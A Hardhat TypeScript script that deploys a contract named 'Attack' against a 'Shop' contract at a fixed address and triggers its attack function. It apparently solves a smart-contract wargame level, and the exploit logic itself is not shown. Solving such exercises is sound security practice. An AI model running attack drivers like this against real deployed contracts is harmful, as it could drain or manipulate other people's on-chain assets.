// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";

async function main() {
  // get shop contract
  const SHOP_ADDRESS = "0xba2b4C20b29f0E6Aef83Da0cA7139f709f71e8F9"
  const shop = await ethers.getContractAt("Shop", SHOP_ADDRESS)


  // deploy attack
  const Attack = await ethers.getContractFactory("Attack");
  const attack = await Attack.deploy(shop.address);
  await attack.deployed()
  console.log(`attack contract deployed at ${attack.address}`)

  // call attack function
  const attackTx = await attack.attack(
    {
      gasLimit: 100000
    }
  )
  await attackTx.wait(4)

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
